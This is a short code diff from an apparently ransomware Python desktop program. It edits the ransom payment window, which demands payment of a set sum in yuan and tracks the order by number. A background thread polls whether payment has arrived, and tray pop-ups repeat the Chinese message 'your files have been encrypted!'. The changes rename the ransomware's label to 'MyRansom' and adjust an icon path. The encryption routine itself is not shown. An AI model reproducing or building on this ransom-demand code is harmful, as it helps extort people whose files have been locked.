@@ -91,7 +91,7 @@ class Pay_window(QMainWindow, Ui_PayWindow):
         self.label_2.setScaledContents(True)    # 让图片自适应label大小
         self.label.setText(f'请支付{total_amount}元')
         self.print_logs(f'交易创建 订单号:{out_trade_no} 付款金额:{total_amount}')
-        self.tray.setIcon(QtGui.QIcon(CUR_PATH+'\\icon.png')) #设置系统托盘图标
+        self.tray.setIcon(QtGui.QIcon(f'{CUR_PATH}/UI/icon.png')) #设置系统托盘图标
         self.thread = threading.Thread(target=self.query_order, args=(self.out_trade_no,))
         self.thread.setDaemon(True)
         self.thread.start()     
@@ -111,11 +111,11 @@ class Pay_window(QMainWindow, Ui_PayWindow):
         self.listWidget.addItem(log)
 
     def iconActivated(self,reason):
-        self.tray.showMessage(u"马哥勒索", '你的文件被加密了！', icon=1) 
+        self.tray.showMessage("MyRansom", '你的文件被加密了！', icon=1) 
         time.sleep(1)
-        self.tray.showMessage(u"马哥勒索", '你的文件被加密了！', icon=2)
+        self.tray.showMessage("MyRansom", '你的文件被加密了！', icon=2)
         time.sleep(1)
-        self.tray.showMessage(u"马哥勒索", '你的文件被加密了！', icon=3) 
+        self.tray.showMessage("MyRansom", '你的文件被加密了！', icon=3) 
 
 
     # 查询订单支付情况
